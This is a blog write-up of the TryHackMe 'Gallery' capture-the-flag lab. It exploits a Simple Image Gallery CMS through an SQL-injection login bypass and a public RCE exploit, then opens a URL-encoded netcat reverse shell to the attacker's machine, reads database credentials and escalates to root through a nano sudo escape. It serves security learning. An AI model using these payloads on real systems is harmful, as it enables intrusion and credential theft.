---
layout: post
title: Gallery - TryHackMe Write-up
canonical_url: https://systemweakness.com/gallery-tryhackme-write-up-a52128a0557e?source=rss-348ebd5cdb70------2
---

<h3>TryHackMe : Gallery</h3><p>Hello everyone, I hope you all are doing great. This is my first blog of any TryHackMe room walk-through. So, let’s get started. So I am gonna start with a TryHackMe room called <a href="https://tryhackme.com/room/gallery666"><strong><em>Gallery</em></strong></a> created by <a href="https://twitter.com/mika_sec"><strong><em>Mika</em></strong></a> today which includes the following sub-categories in the room :</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/616/1*KVJod0xJy4iDMVRYNQliHg.png" /><figcaption>Sub-categories of the room</figcaption></figure><p><strong>Room Link</strong> :- <a href="https://tryhackme.com/room/gallery666"><em>https://tryhackme.com/room/gallery666</em></a></p><p><strong>My Profile</strong> :- <a href="https://tryhackme.com/p/Bornunique911"><em>https://tryhackme.com/p/Bornunique911</em></a></p><p><strong>My socials</strong> :-</p><p><strong>Twitter</strong> :- <a href="https://twitter.com/Bornunique911">https://twitter.com/Bornunique911</a></p><h4>— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — -</h4><h4>P0rt Sc4nn1ng :-</h4><p>Let’s deploy our machine and run <strong>Nmap</strong> to find open ports and services which are running on them and which we will be enumerating after the Nmap scan is completely done.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/776/1*bpVMr61EHveghiP7kXc4fw.png" /><figcaption>Nmap scan results</figcaption></figure><p>As we can observe from the nmap scan results that they are two ports open which are <strong>Port 80</strong> and <strong>Port 8080</strong>. Let’s enumerate the ports one by one.</p><p><strong>P0rt 80</strong></p><p>As always it is a default Apache page. Nothing interesting here. Let’s move on to <strong>Port 8080.</strong></p><p><strong>P0rt 8080</strong></p><p>When we visit to port 8080, it redirects the page to <a href="http://10.10.232.246/gallery/login.php">http://10.10.231.162/gallery/login.php</a> which is a simple login page hosted on some CMS(Content Management System). So the CMS used here can be guessed by the title of the page.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/496/1*52AhSiZzPNIMMZiR1_8Giw.png" /></figure><p>So the CMS used here is <strong><em>Simple Image Gallery</em></strong> . So let’s do a quick google search for the available exploits for that particular CMS. So we get some nice results while googling :</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/874/1*657Cz7H0dXrgBbzo6mYuxA.png" /><figcaption>Google Search results for Simple Image Gallery CMS</figcaption></figure><p>So let’s check the links one by one and we get some interesting information from two exploit-db links that the simple image gallery CMS is vulnerable to SQL Injection and Remote Code Execution without authentication . The exploit-db links is as under :-</p><p><a href="https://www.exploit-db.com/exploits/50198">https://www.exploit-db.com/exploits/50198</a></p><p><a href="https://www.exploit-db.com/exploits/50214">Offensive Security&#39;s Exploit Database Archive</a></p><p>So from the above two links, the best link which suits here is the Remote Code Execution with an unauthenticated bypass as we are not logged in yet. So let’s see the source code of the exploit.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*OqNH3bJ4j4f_LU5yOTJ4yA.png" /><figcaption>RCE Unauthenticated Exploit</figcaption></figure><p>So the source code is written in python, so basically by looking at the source code we can bypass the login page without logging in and we can perform remote code execution by visiting the shell URL. Here we have two options whether to login manually with the credentials mentioned in the source code of the exploit or we can just run the exploit by specifying the target URL and visit the Shell URL.</p><p><strong><em>Option 1 : Login Manually by the credentials provided in the source code :-</em></strong></p><figure><img alt="" src="https://cdn-images-1.medium.com/max/491/1*7deYR2TvsxJMYpjXYu4JhA.png" /><figcaption>Credentials to the login page</figcaption></figure><p><strong><em>Option 2 : By running the exploit by specifying the TARGET and visiting the Shell URL :-</em></strong></p><figure><img alt="" src="https://cdn-images-1.medium.com/max/819/1*TGMrcJ6DO6P6PTpSW2ZanQ.png" /><figcaption>Running exploit by specifying the TARGET</figcaption></figure><p>So I will proceed with option 1 which is logging in manually by using the following credentials :-</p><pre>Username :- admin&#39; or &#39;1&#39;=&#39;1&#39;#<br>Password :- Leaving Blank  </pre><p>So we are logged in successfully. So let’s move further.</p><h4>RC3</h4><p>So far RCE exploit is concerned we need to upload a reverse shell to get a shell on our machine. So I downloaded the exploit into my local machine and I ran it. So I got the following as output :-</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/819/1*TGMrcJ6DO6P6PTpSW2ZanQ.png" /><figcaption>Output after running the exploit locally</figcaption></figure><p>Let’s visit the Shell URL now, we get following output :</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/984/1*0GL0Sc_yF337boJoFakrtw.png" /><figcaption>Remote code Execution</figcaption></figure><h4>G3tt1ng Sh3ll</h4><p>Now as we confirmed that there is a remote code execution we will upload a reverse shell now. But as per my experience uploading reverse shell as plain text will fail so I will upload the reverse shell by encoding the URL as under :-</p><pre><a href="http://10.10.232.246/gallery/uploads/1646679480_TagokobxhhagrwqkzviLetta.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2&gt;%261|nc+MACHINE-IP+PORT+&gt;/tmp/f">http://10.10.232.246/gallery/uploads/1646679480_TagokobxhhagrwqkzviLetta.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2&gt;%261|nc+MACHINE-IP+PORT+&gt;/tmp/f</a></pre><p>Now let’s setup a netcat listener on our terminal to get a shell by triggering the above URL. Boom we got a shell as <strong><em>www-data.</em></strong></p><figure><img alt="" src="https://cdn-images-1.medium.com/max/476/1*zHZDTO93UGjLEZiG9uQ8gQ.png" /><figcaption>Shell as a www-data user</figcaption></figure><p>Let’s now stabilize the <strong>sh</strong> shell to the <strong>bash</strong> shell, by the following command :</p><pre>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</pre><p>Now that our shell is upgraded to <strong>bash</strong> shell, we can export the <strong>TERM</strong> to screen as a normal terminal screen. But still the shell is not completely stabilized so for that we used the following commands to stabilize perfectly:</p><pre>CTRL + Z<br>stty raw -echo;fg ENTER x2</pre><p>So, the shell is stabilized perfectly.Let’s move further.</p><h4><strong>F1nd1ng Th3 H4sh P4ssw0rd 0f th3 4dm1n (_)s3r</strong> :</h4><p>While enumerating the file system I found that there is a <strong><em>initialize.php</em></strong> file in the <strong><em>/var/www/html/gallery</em></strong> directory. Let’s have a look inside the file and there we found some mysql creds which can be useful to us for enumerating the users if there is any users stored in the database.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*X4tpCbF5C_mUHztZEC1xBA.png" /><figcaption>mysql creds</figcaption></figure><p>Let’s connect with those creds to mysql database.</p><pre>mysql -u gallery_user -p<br>Enter password: passw0rd321</pre><figure><img alt="" src="https://cdn-images-1.medium.com/max/700/1*_xpZImo9TnnZ7vf3RjeCkw.png" /><figcaption>Successful login to the database</figcaption></figure><p>Cool, we got the access successfully to the database. Now let’s enumerate the databases by following command :</p><pre>show databases;</pre><figure><img alt="" src="https://cdn-images-1.medium.com/max/695/1*JGOBHZj7R-yfs_VW5KC_3w.png" /><figcaption>MySQL Databases</figcaption></figure><p>As per the above screenshot, we have two databases. Among them, <strong>gallery_db </strong>seems to be interesting. So let’s use it.</p><pre>use gallery_db;</pre><figure><img alt="" src="https://cdn-images-1.medium.com/max/656/1*fAnJYrMd3Gl4QWhe8d19zQ.png" /><figcaption>Database changed to gallery_db</figcaption></figure><p>Let’s explore the tables for the particular database.</p><pre>show tables;</pre><figure><img alt="" src="https://cdn-images-1.medium.com/max/632/1*X2-HtO5FBIckL0rvP5j9hg.png" /><figcaption>Tables for a database gallery_db</figcaption></figure><p>There are four tables in the database <strong>gallery_db</strong>. Among them, <strong><em>users </em></strong>table seems to be interesting and maybe there should be some juicy information inside the table. Let’s enumerate the table <strong><em>users </em></strong>:</p><pre>select * from users;</pre><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*bn48HNguo3hAyyF7i94Jag.png" /><figcaption>Hash Password of the admin user</figcaption></figure><p>Finally we got the hash password for the admin user by connecting to mysql database.</p><h4><strong><em>3sc4l4t10n T0 M1k3 (_)s3r</em></strong></h4><p>Okay now let’s try to escalate <strong><em>m1k3</em></strong> user and find our user flag. Let’s enumerate the file system again, so after some enumeration I found some interesting directory name <em>“</em><strong><em>mike_home_backup</em></strong><em>” </em>in /var/backups path. Looks like it’s a backup directory for user <strong><em>m1k3</em></strong>’s home directory.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/544/1*CtFXPs2FN-dYuhhd9QYybg.png" /><figcaption>Screenshot of Mike’s home directory stored as a backup in /var/backups directory</figcaption></figure><p>So there’s nothing inside in documents. Now, let’s check bash_history maybe there is something interesting inside. Guess what we found the password for the user <strong><em>m1k3 </em></strong>.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/569/1*vFJhuVSscd7nr-5qQWyH_A.png" /><figcaption>Password for user Mike</figcaption></figure><p>Let’s switch to user Mike, by using the password found.</p><h4>(_)s3r Fl4g</h4><figure><img alt="" src="https://cdn-images-1.medium.com/max/337/1*-mdVaHVIW5sHFAlgRIxkmw.png" /><figcaption>User flag</figcaption></figure><p>Cool, we have a user flag now. Let’s move further for privilege escalation to root.</p><h4>Pr1v1l3g3 3sc4l4t10n T0 R00t</h4><figure><img alt="" src="https://cdn-images-1.medium.com/max/795/1*hLQ57AH10ETWN8hSy3F35w.png" /></figure><p>We can see that <strong><em>M1k3 </em></strong>user can run a script using a sudo and as the root user:</p><p>Let’s see the contents of rootkit.sh :</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/710/1*W1XrMxdz2li8hOaa6yEmDg.png" /><figcaption>Contents of rootkit.sh</figcaption></figure><p>Okay after looking at the contents of rootkit.sh, we have four choices which is <strong><em>versioncheck</em></strong>, <strong><em>update</em></strong>, <strong><em>list</em></strong> and <strong><em>read</em></strong>. Now from the available choices, the last one seems to be interesting as we can run <strong><em>nano</em></strong> as root. Time for a quick look at <a href="https://gtfobins.github.io/"><strong><em>gtfobins</em></strong></a> . As per the <strong><em>gtfobins</em></strong>, we can use <strong><em>nano</em></strong> to get privilege to root.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/281/1*op37m-xvFuSaCRRpHN0D-Q.png" /><figcaption>Privilege escalation via nano command</figcaption></figure><p>Let’s execute the commands as mentioned.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/611/1*k7LAhtFabm-TVVxBTXr86A.png" /><figcaption>Choosing option read because it uses nano command to read the report.txt</figcaption></figure><p>After choosing the read option and hitting enter we are in the <strong><em>nano</em></strong> text editor.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/675/1*TzscRUORs-XDybwL3lHDQQ.png" /><figcaption>Entered in nano text editor after choosing read option</figcaption></figure><p>Now by following the commands as per <strong><em>gtfobins</em></strong>, we need to press CTRL R followed by CTRL X to execute the command and execute the following to get a root shell.</p><pre>reset; sh 1&gt;&amp;0 2&gt;&amp;0</pre><figure><img alt="" src="https://cdn-images-1.medium.com/max/711/1*WiN5yr2jQjyg1z83SSQmRA.png" /><figcaption>Executing the command as per gtfobins</figcaption></figure><p>Boom we are root.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/598/1*67iPju6GeU8gEOjvYSLe-w.png" /><figcaption>After executing the command we got a root shell</figcaption></figure><p>Now we can read root.txt file by changing directory to root directory.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/417/1*bGgENeAaBkTafRpvia7VvQ.png" /><figcaption>Root flag</figcaption></figure><p>That’s it for the room.We are done with TryHackMe’s Gallery room.</p><p>Thanks for reading. Peace !!!</p><img src="https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=a52128a0557e" width="1" height="1" alt=""><hr><p><a href="https://systemweakness.com/gallery-tryhackme-write-up-a52128a0557e">Gallery - TryHackMe Write-up</a> was originally published in <a href="https://systemweakness.com">System Weakness</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>
